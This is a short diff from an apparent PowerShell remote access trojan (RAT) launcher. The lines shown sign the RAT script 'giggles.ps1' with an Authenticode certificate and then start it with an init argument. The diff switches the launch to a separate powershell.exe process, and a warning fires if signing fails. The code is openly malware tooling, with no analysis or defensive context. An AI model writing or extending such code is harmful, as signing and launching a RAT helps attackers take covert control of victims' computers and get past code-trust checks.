@@ -60,7 +60,7 @@ try {
     Set-AuthenticodeSignature -Certificate $Cert -FilePath "$Save2Path\giggles.ps1" | Out-Null
 
     # Start the RAT
-    ."$Save2Path\giggles.ps1"  -run init
+    powershell.exe "$Save2Path\giggles.ps1"  -run init
 }
 catch {
     Write-Warning "Failed to sign the RAT!`nPlease check your certificate and try again!"
